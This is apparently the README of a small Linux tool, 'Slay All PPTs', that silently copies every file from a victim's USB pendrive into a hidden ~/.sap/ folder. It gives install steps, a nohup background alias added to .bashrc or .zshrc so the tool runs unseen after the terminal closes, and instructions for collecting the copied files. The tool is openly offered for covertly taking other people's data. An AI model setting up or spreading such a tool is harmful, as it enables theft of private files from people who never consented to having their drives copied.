# Slay All PPTs

Idea is to remove all the wanted files from victim's pendrive.

## Installing

To download this repository, you may either clone via git:

$ `git clone https://github.com/lost-plus-found/Slay-All-PPTs`

or download a source code: [Slay All PPTs](https://github.com/lost-plus-found/Slay-All-PPTs/archive/master.zip).

$ `cd Slay-All-PPTs`

$ `sudo make install`

$ `echo $SHELL`

If you get `/usr/bin/bash` then run $`echo 'alias sapbg="nohup sap > /dev/null 2>&1 &"' >> ~/.bashrc`

Else if you get `/usr/bin/zsh` then run $`echo 'alias sapbg="nohup sap > /dev/null 2>&1 &"' >> ~/.zshrc`

Press `control + d`

## Update

$ `sudo make update`

## Uninstalling

$ `sudo make uninstall`

### Running the command
Always run the command before inserting the pendrive.

$`sapbg`

Close the terminal(close even if you get background jobs running) and wait till the pendrive is inserted.
After insertion wait for 5 seconds.
You can now find the files in <b>~/.sap/</b>

$`ls ~/.sap/`

###### note: only files with extensions are supported
